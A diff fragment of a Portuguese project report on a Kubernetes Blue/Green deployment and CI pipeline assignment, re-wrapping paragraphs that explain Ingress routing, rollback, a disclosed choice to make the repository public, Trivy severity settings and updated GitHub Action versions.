-endpoint usado pelo Ingress, enquanto seu selector determina qual ambiente recebe o
-tráfego.
+**ClusterIP + Ingress.** Os Services permanecem internos ao cluster e o NGINX
+Ingress é o ponto de entrada HTTP. No Blue/Green, o Service de produção continua
+sendo o endpoint usado pelo Ingress, enquanto seu selector determina qual
+ambiente recebe o tráfego.
 
-**Rollback sem reconstrução da imagem.** No Rolling Update, o histórico do Deployment
-permite retornar à revisão anterior. No Blue/Green, a versão anterior permanece
-disponível enquanto a nova está ativa, então o rollback pode ser feito simplesmente
-redirecionando o tráfego para a outra cor. O trade-off é o consumo adicional de
-recursos, pois os dois ambientes precisam permanecer disponíveis.
+**Rollback sem reconstrução da imagem.** No Rolling Update, o histórico do
+Deployment permite retornar à revisão anterior. No Blue/Green, a versão anterior
+permanece disponível enquanto a nova está ativa, então o rollback pode ser feito
+simplesmente redirecionando o tráfego para a outra cor. O trade-off é o consumo
+adicional de recursos, pois os dois ambientes precisam permanecer disponíveis.
 
 ---
 
@@ -2009,8 +2046,8 @@ o requisito de fundo, e todos foram medidos antes de decidir.
 O enunciado pede repositório **privado** com o professor como collaborator
 `Read`. Este repositório está **público**.
 
-Três recursos exigidos pelo próprio material só funcionam, numa conta pessoal, com
-o repositório público:
+Três recursos exigidos pelo próprio material só funcionam, numa conta pessoal,
+com o repositório público:
 
 | Recurso | Em repo privado |
 | --- | --- |
@@ -2018,11 +2055,11 @@ o repositório público:
 | Branch ruleset na `main` | Exige plano pago |
 | Environment com *required reviewer* | Exige plano pago |
 
-Manter o repositório privado significaria abrir mão do gate de branch protection —
-que vale 30% da rubrica — ou trocar o SARIF por uma saída em texto no log.
+Manter o repositório privado significaria abrir mão do gate de branch protection
+— que vale 30% da rubrica — ou trocar o SARIF por uma saída em texto no log.
 `@HardSource` segue como collaborator, então o acesso do professor à entrega não
-muda. O requisito de fundo, **o professor conseguir avaliar o repositório**, está
-atendido.
+muda. O requisito de fundo, **o professor conseguir avaliar o repositório**,
+está atendido.
 
 ### 2. `MEDIUM` incluído na faixa de severidade do Trivy
 
@@ -2060,11 +2097,11 @@ merge**, está atendido com folga: ele bloqueia mais, não menos.
 Os esqueletos usam `checkout@v4.2.2`, `setup-python@v5.6.0` e `cache@v4.2.4`.
 Rodamos as três no release atual, e o `upload-sarif` na CodeQL Action v4.
 
-Também foi medição: com as versões dos esqueletos, **toda execução reportava oito
-avisos** no painel de *Annotations* — Node.js 20 descontinuado, actions forçadas para
-o Node.js 24, e a CodeQL Action v3 saindo em dezembro de 2026. A prática que o
-material ensina, fixar por SHA de commit, continua inteira; o que mudou foi o
-release fixado.
+Também foi medição: com as versões dos esqueletos, **toda execução reportava
+oito avisos** no painel de *Annotations* — Node.js 20 descontinuado, actions
+forçadas para o Node.js 24, e a CodeQL Action v3 saindo em dezembro de 2026. A
+prática que o material ensina, fixar por SHA de commit, continua inteira; o que
+mudou foi o release fixado.
 
 ---
 
